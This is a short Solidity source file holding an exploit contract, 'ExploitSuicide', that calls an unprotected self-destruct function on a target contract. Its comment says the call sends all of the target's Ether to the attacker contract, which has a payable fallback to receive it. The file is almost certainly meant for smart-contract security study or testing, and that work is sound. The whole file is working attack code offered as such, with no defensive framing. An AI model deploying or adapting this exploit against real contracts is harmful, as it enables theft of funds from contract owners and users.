pragma solidity ^0.4.0;

// Interface for the vulnerable contract
contract ISimpleSuicide {
    function sudicideAnyone() public;
}

contract ExploitSuicide {
    function attack(address _target) public {
        ISimpleSuicide(_target).sudicideAnyone();
        // After this call, all Ether in _target will be sent to this attacker contract
    }

    // Accept Ether sent from selfdestruct
    function () public payable {}
}

